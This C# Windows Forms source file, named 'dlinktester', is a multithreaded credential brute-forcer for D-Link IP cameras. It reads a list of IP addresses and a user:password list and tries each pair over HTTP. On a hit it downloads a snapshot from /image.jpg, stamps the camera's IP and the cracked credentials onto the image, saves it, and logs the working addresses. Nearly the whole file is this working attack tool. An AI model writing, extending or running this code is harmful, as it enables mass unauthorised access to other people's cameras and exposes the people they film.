using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

//dlink:
// /mjpeg.cgi
// /image.jpg

namespace dlinktester
{ 
    public partial class Form1 : Form
    {
        public string workingIpPath = "";
        public string allIpPath = "";
        public string[] IPs;
        public string[] Userlist;
        public string ipsFileName;
        public string passlistFileName;
        public int counter;
        public int iplen;
        public List<String> doneIPs = new List<String> { };
        public int trueCounter = 0;
        public int perc;
        public string directory = System.Reflection.Assembly.GetEntryAssembly().Location + @"\";
        public string appdatafull = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\bruitsettings.dat";
        public string settings = "";
        string[] settingdata;
        public float rainbow;

        public string logdata = "";

        public event System.Windows.Forms.MouseEventHandler MouseDown;

        public Form1()
        {
            InitializeComponent();     
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e); 
            //e.Graphics.DrawRectangle(new Pen(Color.White, 3), this.DisplayRectangle);
            //ControlPaint.DrawBorder(e.Graphics, this.ClientRectangle, Color.LightGray, 2, ButtonBorderStyle.Solid, Color.LightGray, 2, ButtonBorderStyle.Solid, Color.LightGray, 2, ButtonBorderStyle.Solid, Color.LightGray, 2, ButtonBorderStyle.Solid);
        }

        public class MyWebClient : WebClient
        {
            protected override WebRequest GetWebRequest(Uri address)
            {
                var req = base.GetWebRequest(address);
                req.Timeout = 5000;
                return req;
            }
        }

        public void testThread(string[] IPs, string[] Userlist)
        {
            //begin testing
            for (int i = 0; i < IPs.Length; i++)
            {
                this.Invoke(new MethodInvoker(delegate ()
                {
                    counter++;
                    label1.Text = (counter + " / " + iplen);
                }));
                for (int o = 0; o < Userlist.Length; o++)
                {
                    using (MyWebClient client = new MyWebClient())
                    {
                        string currentip = IPs[i];
                        if (currentip.EndsWith(":"))
                        {
                            currentip = currentip.Remove(currentip.Length - 1);
                        }
                        Bitmap b;
                        string[] currentcreds = Userlist[o].Split(':');
                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://" + currentip + settingdata[0]);
                        request.Method = "GET";
                        request.Credentials = new NetworkCredential(currentcreds[0], currentcreds[1]);
                        request.Timeout = 2000;
                        Console.WriteLine(currentcreds[0] + " : " + currentcreds[1]);
                        if (!(doneIPs.Contains(currentip)))
                        {
                            doneIPs.Add(currentip);
                            trueCounter++;

                            perc = (trueCounter / iplen) * 100;
                            progressBar1.Value = perc;
                            this.Invoke(new MethodInvoker(delegate ()
                            {
                                listBox2.Items.Add(currentip);
                                label2.Text = perc.ToString() + "%";
                            }));
                        }
                        try
                        {
                            File.AppendAllText(allIpPath, currentip);
                            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                            if (response.StatusCode == HttpStatusCode.OK | checkBox2.Checked)
                            {
                                Console.WriteLine("GOT 200");
                                client.Credentials = new NetworkCredential(currentcreds[0], currentcreds[1]);
                                try
                                {
                                    byte[] image = client.DownloadData("http://" + currentip + settingdata[1]);
                                    using (var ms = new MemoryStream(image))
                                    {
                                        b = new Bitmap(ms);
                                    }
                                    using (Graphics graphics = Graphics.FromImage(b))
                                    {
                                        PointF firstLocation = new PointF(10f, 10f);
                                        PointF secondLocation = new PointF(10f, 24f);
                                        Font lucFont = new Font("Lucida Console", 10);
                                        PointF Pointvar = new PointF(10f, 10f);
                                        PointF Pointvar2 = new PointF(10f, 24f);
                                        SizeF size = graphics.MeasureString(currentip, lucFont);
                                        SizeF size2 = graphics.MeasureString(currentcreds[0] + " : " + currentcreds[1], lucFont);
                                        RectangleF rect = new RectangleF(Pointvar, size);
                                        RectangleF rect2 = new RectangleF(Pointvar2, size2);
                                        graphics.FillRectangle(Brushes.Black, rect);
                                        graphics.FillRectangle(Brushes.Black, rect2);
                                        graphics.DrawString(currentip, lucFont, Brushes.White, firstLocation);
                                        graphics.DrawString(currentcreds[0] + " : " + currentcreds[1], lucFont, Brushes.White, secondLocation);
                                        graphics.Dispose();
                                    }
                                    this.Invoke(new MethodInvoker(delegate ()
                                    {
                                        listBox1.Items.Add(currentip + " : " + currentcreds[0] + ":" + currentcreds[1]);
                                        pictureBox1.Image = new Bitmap(b);
                                    }));
                                    Random random = new Random();
                                    const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                                    string rand = new string(Enumerable.Repeat(chars, 5).Select(s => s[random.Next(s.Length)]).ToArray());
                                    b.Save(directory + rand + ".jpg", ImageFormat.Jpeg);
                                    b.Dispose();
                                    File.AppendAllText(allIpPath, currentip);
                                    File.AppendAllText(workingIpPath, currentip);
                                    listBox2.Items.Add(currentip);
                                    break;
                                }
                                catch
                                {
                                    break;
                                }

                            }
                            else
                            {

                            }
                        }
                        catch(Exception ex)
                        {

                        }

                    }
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog dlg = new OpenFileDialog())
            {
                dlg.Title = "Open IP file";
                dlg.Filter = "Text files | *.txt";

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    ipsFileName = dlg.FileName;
                    IPs = System.IO.File.ReadAllLines(ipsFileName).ToArray();
                    iplen = IPs.Length;
                    label1.Text = ("0 / " + iplen);
                    button1.ForeColor = Color.Green;
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog dlg = new OpenFileDialog())
            {
                dlg.Title = "Open Passlist file";
                dlg.Filter = "Text files | *.txt";

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    passlistFileName = dlg.FileName;
                    Userlist = System.IO.File.ReadAllLines(passlistFileName).ToArray();
                    button2.ForeColor = Color.Green;
                }
            }
        }

        public static int GetNextInt32(RNGCryptoServiceProvider rnd)
        {
            byte[] randomInt = new byte[4];
            rnd.GetBytes(randomInt);
            return Convert.ToInt32(randomInt[0]);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            button1.Enabled = false;
            button2.Enabled = false;
            button3.Enabled = false;
            button4.Enabled = false;
            button5.Enabled = false;
            checkBox1.Enabled = false;
            checkBox2.Enabled = false;

            if (checkBox1.Checked)
            {
                RNGCryptoServiceProvider rnd2 = new RNGCryptoServiceProvider(); //may be overdoing it a little
                string[] IPs2 = IPs.OrderBy(x => GetNextInt32(rnd2)).ToArray();
                IPs = IPs2;
            }

            string[] Ofirstsplit = IPs.Take(IPs.Length / 2).ToArray();
            string[] Osecondsplit = IPs.Skip(IPs.Length / 2).ToArray();

            string[] firstsplit = Ofirstsplit.Take(Ofirstsplit.Length / 2).ToArray();
            string[] secondsplit = Ofirstsplit.Skip(Ofirstsplit.Length / 2).ToArray();
            string[] thirdsplit = Osecondsplit.Take(Osecondsplit.Length / 2).ToArray();
            string[] forthsplit = Osecondsplit.Skip(Osecondsplit.Length / 2).ToArray();

            Thread a = new Thread(() => testThread(firstsplit, Userlist));
            Thread b = new Thread(() => testThread(secondsplit, Userlist));
            Thread c = new Thread(() => testThread(thirdsplit, Userlist));
            Thread d = new Thread(() => testThread(forthsplit, Userlist));
            a.IsBackground = true;
            b.IsBackground = true;
            c.IsBackground = true;
            d.IsBackground = true;
            a.Start();
            b.Start();
            c.Start();
            d.Start();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            using (var fbd = new FolderBrowserDialog())
            {
                DialogResult result = fbd.ShowDialog();

                if (result == DialogResult.OK && !string.IsNullOrWhiteSpace(fbd.SelectedPath))
                {
                    directory = fbd.SelectedPath + @"\";
                    button4.ForeColor = System.Drawing.Color.Green;
                }
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Form settings = new settings();
            settings.Show();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (!File.Exists(appdatafull))
            {
                File.Create(appdatafull).Close();
            }
            settings = File.ReadAllText(appdatafull);
            settingdata = settings.Split(':');

            //uncomment for rainbows
            //timer1.Start();
        }

        public static Color Rainbow(float progress)
        {
            float div = (Math.Abs(progress % 1) * 6);
            int ascending = (int)((div % 1) * 255);
            int descending = 255 - ascending;

            switch ((int)div)
            {
                case 0:
                    return Color.FromArgb(255, 255, ascending, 0);
                case 1:
                    return Color.FromArgb(255, descending, 255, 0);
                case 2:
                    return Color.FromArgb(255, 0, 255, ascending);
                case 3:
                    return Color.FromArgb(255, 0, descending, 255);
                case 4:
                    return Color.FromArgb(255, ascending, 0, 255);
                default: // case 5:
                    return Color.FromArgb(255, 255, 0, descending);
            }
        }

        private void mouseMove(MouseEventArgs e)
        {
            throw new NotImplementedException();
        }

        bool moving;
        Point offset;
        Point original;

        void panel1_PreviewMouseDown(object sender, MouseEventArgs e)
        {
            ((Control)sender).Capture = false;
            moving = true;
            offset = MousePosition;
            original = this.Location;
        }

        void panel1_PreviewMouseMove(object sender, MouseEventArgs e)
        {
            if (!moving)
                return;

            int x = original.X + MousePosition.X - offset.X;
            int y = original.Y + MousePosition.Y - offset.Y;

            this.Location = new Point(x, y);
        }

        private void button6_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void button7_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {

            //label2.ForeColor = Rainbow(rainbow);
            Console.WriteLine(rainbow);
            rainbow = float.Parse((rainbow + 0.01).ToString());
            if(rainbow == 1)
            {
                rainbow = 0;
            }
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void button6_Click_1(object sender, EventArgs e)
        {
            using (SaveFileDialog dlg = new SaveFileDialog())
            {
                dlg.Title = "Open Working Ip output file";
                dlg.Filter = "Text files | *.txt";

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    workingIpPath = dlg.FileName;
                    button6.ForeColor = Color.Green;
                }
            }
        }

        private void button7_Click_1(object sender, EventArgs e)
        {
            using (SaveFileDialog dlg = new SaveFileDialog())
            {
                dlg.Title = "Open all Ip output file";
                dlg.Filter = "Text files | *.txt";

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    allIpPath = dlg.FileName;
                    button7.ForeColor = Color.Green;
                }
            }
        }
    }
}
